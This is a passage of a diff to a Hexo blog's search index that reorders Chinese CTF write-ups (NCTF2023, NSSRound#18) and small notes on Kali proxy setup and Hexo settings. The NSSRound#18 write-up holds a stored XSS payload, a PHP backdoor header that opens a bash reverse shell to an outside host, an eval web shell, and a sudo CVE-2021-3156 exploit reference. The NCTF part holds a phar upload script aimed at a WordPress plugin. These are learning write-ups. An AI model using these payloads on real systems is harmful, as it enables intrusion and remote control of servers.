 <p>将poc复制上去，修改下文件名为4.jpg以及文件内容为phar（右键从文件粘贴）</p>
-<p><img src="/article/C:/Users\罗思远\AppData\Roaming\Typora\typora-user-images\image-20231229201808140.png"></p>
+<p><img src="/article/NCTF2023/image-20231229201808140.png"></p>
 <p>测试后发现也能弹shell，不会出现二进制数据格式错误</p>
 <p>当然也可以用python脚本上传文件（按照poc改的）</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url = &#x27;http://124.71.184.68:8012/wp-admin/admin-ajax.php&#x27;</span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    &#x27;Accept&#x27;: &#x27;application/json, text/javascript, */*; q=0.01&#x27;,</span><br><span class="line">    &#x27;Accept-Language&#x27;: &#x27;en-GB,en;q=0.5&#x27;,</span><br><span class="line">    &#x27;Accept-Encoding&#x27;: &#x27;gzip, deflate&#x27;,</span><br><span class="line">    &#x27;X-Requested-With&#x27;: &#x27;XMLHttpRequest&#x27;,</span><br><span class="line">    &#x27;Connection&#x27;: &#x27;close&#x27;,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">files = &#123;</span><br><span class="line">    &#x27;size_limit&#x27;: (None, &#x27;10485760&#x27;),</span><br><span class="line">    &#x27;action&#x27;: (None, &#x27;dnd_codedropz_upload&#x27;),</span><br><span class="line">    &#x27;type&#x27;: (None, &#x27;click&#x27;),</span><br><span class="line">    &#x27;upload-file&#x27;: (&#x27;1.jpg&#x27;, open(&#x27;payload.phar&#x27;, &#x27;rb&#x27;), &#x27;image/jpeg&#x27;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">response = requests.post(url, headers=headers, files=files)</span><br><span class="line"></span><br><span class="line">print(response.status_code)</span><br><span class="line">print(response.text)</span><br></pre></td></tr></table></figure>
 
 <p>成功上传</p>
-<p><img src="/article/C:/Users\罗思远\AppData\Roaming\Typora\typora-user-images\image-20231229201102713.png"></p>
+<p><img src="/article/NCTF2023/image-20231229201102713.png"></p>
 <p>然后就是文件读取，将payload编码一下</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">phar:///var/www/html/wp-content/uploads/wp_dndcf7_uploads/wpcf7-files/1.jpg/test.txt</span><br></pre></td></tr></table></figure>
 
 <p>注意phar url的结尾必须加上 <code>/test.txt</code> ,因为在构造phar文件的时候执行的是 <code>$phar-addFromString(&quot;test.txt&quot;, &quot;test&quot;);</code> ,这里的路径需要与代码中的test.txt对应,否则网站会⼀直卡住</p>
 <p>访问<code>/index.php/video</code>并传递参数dl去phar读取文件</p>
-<p><img src="/article/C:/Users\罗思远\AppData\Roaming\Typora\typora-user-images\image-20231229201131924.png"></p>
+<p><img src="/article/NCTF2023/image-20231229201131924.png"></p>
 <p>成功反弹shell</p>
-<p><img src="/article/C:/Users\罗思远\AppData\Roaming\Typora\typora-user-images\image-20231229201213786.png"></p>
+<p><img src="/article/NCTF2023/image-20231229201213786.png"></p>
 <p>尝试suid提权，发现可用命令</p>
-<p><img src="/article/C:/Users\罗思远\AppData\Roaming\Typora\typora-user-images\image-20231229201305498.png"></p>
+<p><img src="/article/NCTF2023/image-20231229201305498.png"></p>
 <p>查找一下date命令如何提权</p>
-<p><img src="/article/C:/Users\罗思远\AppData\Roaming\Typora\typora-user-images\image-20231229201648495.png"></p>
+<p><img src="/article/NCTF2023/image-20231229201648495.png"></p>
 <p>得到flag</p>
-<p><img src="/article/C:/Users\罗思远\AppData\Roaming\Typora\typora-user-images\image-20231229201621224.png"></p>
+<p><img src="/article/NCTF2023/image-20231229201621224.png"></p>
 <h2 id="Webshell-Generator"><a href="#Webshell-Generator" class="headerlink" title="Webshell Generator"></a>Webshell Generator</h2><blockquote>
 <p>考点：sed命令</p>
 </blockquote>
@@ -1122,72 +1122,6 @@
 <p><img src="/article/NCTF2023/image-20240401201711511.png"></p>
 <p>然后再访问得到flag</p>
 <p><img src="/article/NCTF2023/image-20240401201729069.png"></p>
-]]></content>
-      <categories>
-        <category>CTF</category>
-      </categories>
-      <tags>
-        <tag>比赛</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>NSSRound#18 Basic</title>
-    <url>/article/NSSRound#18Basicweb%E8%A7%A3%E6%9E%90.html</url>
-    <content><![CDATA[<p>session伪造、perl_startup提权</p>
-<span id="more"></span>
-
-<h1 id="NSSRound-18-Basic-web解析"><a href="#NSSRound-18-Basic-web解析" class="headerlink" title="[NSSRound#18 Basic]web解析"></a>[NSSRound#18 Basic]web解析</h1><h2 id="门酱想玩什么呢？"><a href="#门酱想玩什么呢？" class="headerlink" title="门酱想玩什么呢？"></a>门酱想玩什么呢？</h2><p>打开题目，加载完视频后要求我们给个游戏链接</p>
-<p><img src="/article/NSSRound#18Basicweb%E8%A7%A3%E6%9E%90/image-20240314151412487.png"></p>
-<p>点开评论区不难发现应该是想玩元梦之星，这里有个评论功能可以上传图片</p>
-<p><img src="/article/NSSRound#18Basicweb%E8%A7%A3%E6%9E%90/image-20240314151551692.png"></p>
-<p>我们随便输入点东西发现是插入并赋值到content元素里面</p>
-<p><img src="/article/NSSRound#18Basicweb%E8%A7%A3%E6%9E%90/image-20240314151833094.png"></p>
-<p>猜测是存储型xss，我们去看看hint访问下<code>/nssctfroundSpring.php</code></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">//部分关键代码</span><br><span class="line">$contentLines = explode(&quot; &quot;, $comment[&#x27;content&#x27;]);</span><br><span class="line">if (preg_match(&#x27;/^https?:\/\/\S+$/&#x27;, $contentLines[0])) &#123;</span><br><span class="line">    if (preg_match(&#x27;/^https?:\/\/[^\/]+\/\S+\.png$/&#x27;, $contentLines[0], $matches) &amp;&amp; end($contentLines) === &#x27;/png&#x27;) &#123;</span><br><span class="line">        $urlParts = parse_url($matches[0]);</span><br><span class="line">        if ($urlParts !== false) &#123;</span><br><span class="line">            echo &#x27;&lt;img class=&quot;content&quot; src=&quot;&#x27; . $matches[0] . &#x27;&quot;&gt;&#x27;;</span><br><span class="line">            //.......</span><br><span class="line">        &#125;</span><br><span class="line">        //......</span><br><span class="line">    &#125;</span><br><span class="line">    //......</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
-
-<p>大概就是对评论的图片链接格式的过滤</p>
-<p>我们要跳转到元梦之星用到location去跳转，最基础的payload</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;document.location=&quot;https://ymzx.qq.com&quot;&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-
-<p><img src="/article/NSSRound#18Basicweb%E8%A7%A3%E6%9E%90/image-20240314152704432.png"></p>
-<p>然后按照上文的匹配条件修改一下以及闭合前面的<code>&lt;</code>和<code>&quot;</code>，最终构如下</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://&quot;&gt;&lt;script&gt;document.location=&quot;https://ymzx.qq.com&quot;&lt;/script&gt;.png /png</span><br></pre></td></tr></table></figure>
-
-<p><img src="/article/NSSRound#18Basicweb%E8%A7%A3%E6%9E%90/image-20240314152541734.png"></p>
-<p>成功跳转元梦之星</p>
-<p>然后就是如何给门酱一个链接</p>
-<p><img src="/article/NSSRound#18Basicweb%E8%A7%A3%E6%9E%90/image-20240314152846028.png"></p>
-<p>也就是说需要门酱自己网站的链接去跳转，由于我们通过xss语句已经插入到img的src中实现跳转到元梦之星</p>
-<p>所以我们只需要抓包跳转时的界面，就可以得到门酱跳转时的请求参数值</p>
-<p><img src="/article/NSSRound#18Basicweb%E8%A7%A3%E6%9E%90/image-20240314153152573.png"></p>
-<p>拼接上题目路径即可</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://node4.anna.nssctf.cn:28757/words/?title=cmV2MXZl&amp;content=aHR0cCUzQSUyRiUyRiUyMiUzRSUzQ3NjcmlwdCUzRWRvY3VtZW50LmxvY2F0aW9uJTNEJTIyaHR0cHMlM0ElMkYlMkZ5bXp4LnFxLmNvbSUyMiUzQyUyRnNjcmlwdCUzRS5wbmclMjAlMkZwbmc%3D</span><br></pre></td></tr></table></figure>
-
-<p>得到flag</p>
-<p><img src="/article/NSSRound#18Basicweb%E8%A7%A3%E6%9E%90/image-20240314153311602.png"></p>
-<h2 id="Becomeroot"><a href="#Becomeroot" class="headerlink" title="Becomeroot"></a>Becomeroot</h2><p>打开题目提示在&#x2F;root里面，应该是最后要提权</p>
-<p><img src="/article/NSSRound#18Basicweb%E8%A7%A3%E6%9E%90/image-20240315123434018.png"></p>
-<p>按照提示和php开发仓库入侵有关，搜出来刚好是对应题目php版本，可以利用<strong>User-Agentt</strong>头来命令执行 <a href="https://forum.butian.net/index.php/share/553">参考文章</a></p>
-<p>我们bp抓包，构造如下</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">User-Agentt: zerodiumsystem(&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/5i781963p2.yicp.fun/58265 0&gt;&amp;1&#x27;&quot;);</span><br></pre></td></tr></table></figure>
-
-
-
-<p><img src="/article/NSSRound#18Basicweb%E8%A7%A3%E6%9E%90/image-20240315123828640.png"></p>
-<p>反弹成功，接下来尝试sh脚本提权发现不行</p>
-<p>提示说和sudo提权有关，刚刚试了<code>sudo -l -S</code>是需要密码的所以肯定是存在提权漏洞</p>
-<p>搜出来<code>CVE-2021-3156</code></p>
-<p><img src="/article/NSSRound#18Basicweb%E8%A7%A3%E6%9E%90/image-20240315124217000.png"></p>
-<p>nc连接的靶机上传脚本比较麻烦，所以我们写马利用蚁剑上传</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">User-Agentt: zerodiumsystem(&quot;echo &#x27;&lt;?php eval(\$_POST[1]);?&gt;&#x27;&gt;/var/www/html/shell.php&quot;);</span><br></pre></td></tr></table></figure>
-
-<p><a href="https://gitcode.com/Rvn0xsy/CVE-2021-3156-plus/overview">漏洞exp利用链接</a></p>
-<p>上传成功</p>
-<p><img src="/article/NSSRound#18Basicweb%E8%A7%A3%E6%9E%90/image-20240315124426238.png"></p>
-<p>然后再nc连接，成功提权</p>
-<p><img src="/article/NSSRound#18Basicweb%E8%A7%A3%E6%9E%90/image-20240315124529389.png"></p>
-<p>得到flag</p>
-<p><img src="/article/NSSRound#18Basicweb%E8%A7%A3%E6%9E%90/image-20240315124558684.png"></p>
 ]]></content>
       <categories>
         <category>CTF</category>
@@ -1265,6 +1199,72 @@
 <p><img src="/article/NKCTF2024web%E8%A7%A3%E6%9E%90/image-20240325235724144.png"></p>
 <p>然后成功反弹shell，在<code>proc/1/environ</code>找到flag</p>
 <p><img src="/article/NKCTF2024web%E8%A7%A3%E6%9E%90/image-20240326001639956.png"></p>
+]]></content>
+      <categories>
+        <category>CTF</category>
+      </categories>
+      <tags>
+        <tag>比赛</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>NSSRound#18 Basic</title>
+    <url>/article/NSSRound-18-Basic.html</url>
+    <content><![CDATA[<p>session伪造、perl_startup提权</p>
+<span id="more"></span>
+
+<h2 id="门酱想玩什么呢？"><a href="#门酱想玩什么呢？" class="headerlink" title="门酱想玩什么呢？"></a>门酱想玩什么呢？</h2><p>打开题目，加载完视频后要求我们给个游戏链接</p>
+<p><img src="/article/NSSRound#18Basicweb%E8%A7%A3%E6%9E%90/image-20240314151412487.png"></p>
+<p>点开评论区不难发现应该是想玩元梦之星，这里有个评论功能可以上传图片</p>
+<p><img src="/article/NSSRound#18Basicweb%E8%A7%A3%E6%9E%90/image-20240314151551692.png"></p>
+<p>我们随便输入点东西发现是插入并赋值到content元素里面</p>
+<p><img src="/article/NSSRound#18Basicweb%E8%A7%A3%E6%9E%90/image-20240314151833094.png"></p>
+<p>猜测是存储型xss，我们去看看hint访问下<code>/nssctfroundSpring.php</code></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">//部分关键代码</span><br><span class="line">$contentLines = explode(&quot; &quot;, $comment[&#x27;content&#x27;]);</span><br><span class="line">if (preg_match(&#x27;/^https?:\/\/\S+$/&#x27;, $contentLines[0])) &#123;</span><br><span class="line">    if (preg_match(&#x27;/^https?:\/\/[^\/]+\/\S+\.png$/&#x27;, $contentLines[0], $matches) &amp;&amp; end($contentLines) === &#x27;/png&#x27;) &#123;</span><br><span class="line">        $urlParts = parse_url($matches[0]);</span><br><span class="line">        if ($urlParts !== false) &#123;</span><br><span class="line">            echo &#x27;&lt;img class=&quot;content&quot; src=&quot;&#x27; . $matches[0] . &#x27;&quot;&gt;&#x27;;</span><br><span class="line">            //.......</span><br><span class="line">        &#125;</span><br><span class="line">        //......</span><br><span class="line">    &#125;</span><br><span class="line">    //......</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
+
+<p>大概就是对评论的图片链接格式的过滤</p>
+<p>我们要跳转到元梦之星用到location去跳转，最基础的payload</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;document.location=&quot;https://ymzx.qq.com&quot;&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/article/NSSRound#18Basicweb%E8%A7%A3%E6%9E%90/image-20240314152704432.png"></p>
+<p>然后按照上文的匹配条件修改一下以及闭合前面的<code>&lt;</code>和<code>&quot;</code>，最终构如下</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://&quot;&gt;&lt;script&gt;document.location=&quot;https://ymzx.qq.com&quot;&lt;/script&gt;.png /png</span><br></pre></td></tr></table></figure>
+
+<p><img src="/article/NSSRound#18Basicweb%E8%A7%A3%E6%9E%90/image-20240314152541734.png"></p>
+<p>成功跳转元梦之星</p>
+<p>然后就是如何给门酱一个链接</p>
+<p><img src="/article/NSSRound#18Basicweb%E8%A7%A3%E6%9E%90/image-20240314152846028.png"></p>
+<p>也就是说需要门酱自己网站的链接去跳转，由于我们通过xss语句已经插入到img的src中实现跳转到元梦之星</p>
+<p>所以我们只需要抓包跳转时的界面，就可以得到门酱跳转时的请求参数值</p>
+<p><img src="/article/NSSRound#18Basicweb%E8%A7%A3%E6%9E%90/image-20240314153152573.png"></p>
+<p>拼接上题目路径即可</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://node4.anna.nssctf.cn:28757/words/?title=cmV2MXZl&amp;content=aHR0cCUzQSUyRiUyRiUyMiUzRSUzQ3NjcmlwdCUzRWRvY3VtZW50LmxvY2F0aW9uJTNEJTIyaHR0cHMlM0ElMkYlMkZ5bXp4LnFxLmNvbSUyMiUzQyUyRnNjcmlwdCUzRS5wbmclMjAlMkZwbmc%3D</span><br></pre></td></tr></table></figure>
+
+<p>得到flag</p>
+<p><img src="/article/NSSRound#18Basicweb%E8%A7%A3%E6%9E%90/image-20240314153311602.png"></p>
+<h2 id="Becomeroot"><a href="#Becomeroot" class="headerlink" title="Becomeroot"></a>Becomeroot</h2><p>打开题目提示在&#x2F;root里面，应该是最后要提权</p>
+<p><img src="/article/NSSRound#18Basicweb%E8%A7%A3%E6%9E%90/image-20240315123434018.png"></p>
+<p>按照提示和php开发仓库入侵有关，搜出来刚好是对应题目php版本，可以利用<strong>User-Agentt</strong>头来命令执行 <a href="https://forum.butian.net/index.php/share/553">参考文章</a></p>
+<p>我们bp抓包，构造如下</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">User-Agentt: zerodiumsystem(&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/5i781963p2.yicp.fun/58265 0&gt;&amp;1&#x27;&quot;);</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/article/NSSRound#18Basicweb%E8%A7%A3%E6%9E%90/image-20240315123828640.png"></p>
+<p>反弹成功，接下来尝试sh脚本提权发现不行</p>
+<p>提示说和sudo提权有关，刚刚试了<code>sudo -l -S</code>是需要密码的所以肯定是存在提权漏洞</p>
+<p>搜出来<code>CVE-2021-3156</code></p>
+<p><img src="/article/NSSRound#18Basicweb%E8%A7%A3%E6%9E%90/image-20240315124217000.png"></p>
+<p>nc连接的靶机上传脚本比较麻烦，所以我们写马利用蚁剑上传</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">User-Agentt: zerodiumsystem(&quot;echo &#x27;&lt;?php eval(\$_POST[1]);?&gt;&#x27;&gt;/var/www/html/shell.php&quot;);</span><br></pre></td></tr></table></figure>
+
+<p><a href="https://gitcode.com/Rvn0xsy/CVE-2021-3156-plus/overview">漏洞exp利用链接</a></p>
+<p>上传成功</p>
+<p><img src="/article/NSSRound#18Basicweb%E8%A7%A3%E6%9E%90/image-20240315124426238.png"></p>
+<p>然后再nc连接，成功提权</p>
+<p><img src="/article/NSSRound#18Basicweb%E8%A7%A3%E6%9E%90/image-20240315124529389.png"></p>
+<p>得到flag</p>
+<p><img src="/article/NSSRound#18Basicweb%E8%A7%A3%E6%9E%90/image-20240315124558684.png"></p>
 ]]></content>
       <categories>
         <category>CTF</category>
@@ -2447,30 +2447,6 @@
       </categories>
   </entry>
   <entry>
-    <title>博客常用设置</title>
-    <url>/article/%E5%8D%9A%E5%AE%A2%E5%B8%B8%E7%94%A8%E8%AE%BE%E7%BD%AE.html</url>
-    <content><![CDATA[<p>一些基于hexo搭建的博客的基本设置</p>
-<span id="more"></span>
-
-
-
-<h1 id="博客常用设置"><a href="#博客常用设置" class="headerlink" title="博客常用设置"></a>博客常用设置</h1><h2 id="本地部署"><a href="#本地部署" class="headerlink" title="本地部署"></a>本地部署</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo s</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="发表文章"><a href="#发表文章" class="headerlink" title="发表文章"></a>发表文章</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo cl &amp; hexo &amp; hexo g &amp; hexo d</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="设置标题"><a href="#设置标题" class="headerlink" title="设置标题"></a>设置标题</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">---</span><br><span class="line">title: Clicker-HackTheBox</span><br><span class="line">tags:</span><br><span class="line">  - 提权</span><br><span class="line">categories:</span><br><span class="line">  - HTB-writeup</span><br><span class="line">date: 2024-1-10</span><br><span class="line">abbrlink: 6d2044b3</span><br><span class="line">---</span><br><span class="line"></span><br><span class="line">session伪造、perl_startup提权</span><br><span class="line">&lt;!-- more --&gt;</span><br></pre></td></tr></table></figure>
-
-<p><code>&lt;!-- more --&gt;</code>标签可以使文章只展示前文概要，阅读整篇文章需要点击进去</p>
-]]></content>
-      <categories>
-        <category>杂项</category>
-      </categories>
-  </entry>
-  <entry>
     <title>红明谷杯2024</title>
     <url>/article/%E7%BA%A2%E6%98%8E%E8%B0%B72024.html</url>
     <content><![CDATA[<p>pcntl_exec绕过disable_function限制、Rust语言</p>
@@ -2554,6 +2530,71 @@
       </tags>
   </entry>
   <entry>
+    <title>记录kali如何挂梯子</title>
+    <url>/article/%E8%AE%B0%E5%BD%95kali%E5%A6%82%E4%BD%95%E6%8C%82%E6%A2%AF%E5%AD%90.html</url>
+    <content><![CDATA[<p>记录下kali如何挂梯子</p>
+<span id="more"></span>
+
+
+
+<p><strong>前言</strong></p>
+<blockquote>
+<p>网上关于Linux挂梯子的教程有挺多的，不过一开始按照参考文章都不行（搁置了好久）。现在有时间来弄结果成功了，特此记录下</p>
+</blockquote>
+<p><strong>步骤</strong></p>
+<p>我们先创建clash目录</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mkdir clash</span><br></pre></td></tr></table></figure>
+
+<p>然后我们下载压缩包文件，选择第一个</p>
+<p>链接：<a href="https://archive.org/download/clash_for_windows_pkg">https://archive.org/download/clash_for_windows_pkg</a></p>
+<p><img src="/article/%E8%AE%B0%E5%BD%95kali%E5%A6%82%E4%BD%95%E6%8C%82%E6%A2%AF%E5%AD%90/image-20240425211553427.png"></p>
+<p>解压后进入目录<code>Clash for Windows-0.20.39-x64-linux</code>，试试执行下程序</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./cfw</span><br></pre></td></tr></table></figure>
+
+<p><img src="/article/%E8%AE%B0%E5%BD%95kali%E5%A6%82%E4%BD%95%E6%8C%82%E6%A2%AF%E5%AD%90/image-20240425212131108.png"></p>
+<p>成功打开后，我们可以汉化一下</p>
+<p>访问<code>https://github.com/Z-Siqi/Clash-for-Windows_Chinese</code>，点击release后下载app.asar文件</p>
+<p>然后替换<code>/clash/Clash for Windows-0.20.39-x64-linux/resources/</code>目录下的同名文件，重新启动即可</p>
+<p><img src="/article/%E8%AE%B0%E5%BD%95kali%E5%A6%82%E4%BD%95%E6%8C%82%E6%A2%AF%E5%AD%90/image-20240425212641961.png"></p>
+<p>然后就是导入配置文件，我这里是直接在物理机下载下来配置文件然后导入</p>
+<p><img src="/article/%E8%AE%B0%E5%BD%95kali%E5%A6%82%E4%BD%95%E6%8C%82%E6%A2%AF%E5%AD%90/image-20240425212813415.png"></p>
+<p>最后就是设置浏览器代理</p>
+<p><img src="/article/%E8%AE%B0%E5%BD%95kali%E5%A6%82%E4%BD%95%E6%8C%82%E6%A2%AF%E5%AD%90/image-20240425212844360.png"></p>
+<p>设置好后，就能成功使用魔法访问外网</p>
+<p><img src="/article/%E8%AE%B0%E5%BD%95kali%E5%A6%82%E4%BD%95%E6%8C%82%E6%A2%AF%E5%AD%90/image-20240425212931593.png"></p>
+]]></content>
+      <categories>
+        <category>工具</category>
+      </categories>
+      <tags>
+        <tag>Linux</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>博客常用设置</title>
+    <url>/article/%E5%8D%9A%E5%AE%A2%E5%B8%B8%E7%94%A8%E8%AE%BE%E7%BD%AE.html</url>
+    <content><![CDATA[<p>一些基于hexo搭建的博客的基本设置</p>
+<span id="more"></span>
+
+
+
+<h1 id="博客常用设置"><a href="#博客常用设置" class="headerlink" title="博客常用设置"></a>博客常用设置</h1><h2 id="本地部署"><a href="#本地部署" class="headerlink" title="本地部署"></a>本地部署</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo s</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="发表文章"><a href="#发表文章" class="headerlink" title="发表文章"></a>发表文章</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo cl &amp; hexo &amp; hexo g &amp; hexo d</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="设置标题"><a href="#设置标题" class="headerlink" title="设置标题"></a>设置标题</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">---</span><br><span class="line">title: Clicker-HackTheBox</span><br><span class="line">tags:</span><br><span class="line">  - 提权</span><br><span class="line">categories:</span><br><span class="line">  - HTB-writeup</span><br><span class="line">date: 2024-1-10</span><br><span class="line">abbrlink: 6d2044b3</span><br><span class="line">---</span><br><span class="line"></span><br><span class="line">session伪造、perl_startup提权</span><br><span class="line">&lt;!-- more --&gt;</span><br></pre></td></tr></table></figure>
+
+<p><code>&lt;!-- more --&gt;</code>标签可以使文章只展示前文概要，阅读整篇文章需要点击进去</p>
+]]></content>
+      <categories>
+        <category>杂项</category>
+      </categories>
+  </entry>
+  <entry>
     <title>致远OA-ajax.do任意文件上传漏洞</title>
     <url>/article/%E8%87%B4%E8%BF%9COA-ajax-do%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.html</url>
     <content><![CDATA[<p>利用此漏洞来连接冰蝎，可用来命令执行或者数据库连接</p>
@@ -2599,47 +2640,6 @@
       <categories>
         <category>漏洞分析</category>
       </categories>
-  </entry>
-  <entry>
-    <title>记录kali如何挂梯子</title>
-    <url>/article/%E8%AE%B0%E5%BD%95kali%E5%A6%82%E4%BD%95%E6%8C%82%E6%A2%AF%E5%AD%90.html</url>
-    <content><![CDATA[<p>记录下kali如何挂梯子</p>
-<span id="more"></span>
-
-
-
-<p><strong>前言</strong></p>
-<blockquote>
-<p>网上关于Linux挂梯子的教程有挺多的，不过一开始按照参考文章都不行（搁置了好久）。现在有时间来弄结果成功了，特此记录下</p>
-</blockquote>
-<p><strong>步骤</strong></p>
-<p>我们先创建clash目录</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mkdir clash</span><br></pre></td></tr></table></figure>
-
-<p>然后我们下载压缩包文件，选择第一个</p>
-<p>链接：<a href="https://archive.org/download/clash_for_windows_pkg">https://archive.org/download/clash_for_windows_pkg</a></p>
-<p><img src="/article/%E8%AE%B0%E5%BD%95kali%E5%A6%82%E4%BD%95%E6%8C%82%E6%A2%AF%E5%AD%90/image-20240425211553427.png"></p>
-<p>解压后进入目录<code>Clash for Windows-0.20.39-x64-linux</code>，试试执行下程序</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./cfw</span><br></pre></td></tr></table></figure>
-
-<p><img src="/article/%E8%AE%B0%E5%BD%95kali%E5%A6%82%E4%BD%95%E6%8C%82%E6%A2%AF%E5%AD%90/image-20240425212131108.png"></p>
-<p>成功打开后，我们可以汉化一下</p>
-<p>访问<code>https://github.com/Z-Siqi/Clash-for-Windows_Chinese</code>，点击release后下载app.asar文件</p>
-<p>然后替换<code>/clash/Clash for Windows-0.20.39-x64-linux/resources/</code>目录下的同名文件，重新启动即可</p>
-<p><img src="/article/%E8%AE%B0%E5%BD%95kali%E5%A6%82%E4%BD%95%E6%8C%82%E6%A2%AF%E5%AD%90/image-20240425212641961.png"></p>
-<p>然后就是导入配置文件，我这里是直接在物理机下载下来配置文件然后导入</p>
-<p><img src="/article/%E8%AE%B0%E5%BD%95kali%E5%A6%82%E4%BD%95%E6%8C%82%E6%A2%AF%E5%AD%90/image-20240425212813415.png"></p>
-<p>最后就是设置浏览器代理</p>
-<p><img src="/article/%E8%AE%B0%E5%BD%95kali%E5%A6%82%E4%BD%95%E6%8C%82%E6%A2%AF%E5%AD%90/image-20240425212844360.png"></p>
-<p>设置好后，就能成功使用魔法访问外网</p>
-<p><img src="/article/%E8%AE%B0%E5%BD%95kali%E5%A6%82%E4%BD%95%E6%8C%82%E6%A2%AF%E5%AD%90/image-20240425212931593.png"></p>
-]]></content>
-      <categories>
-        <category>工具</category>
-      </categories>
-      <tags>
-        <tag>Linux</tag>
-      </tags>
   </entry>
   <entry>
     <title>陇剑杯2021</title>
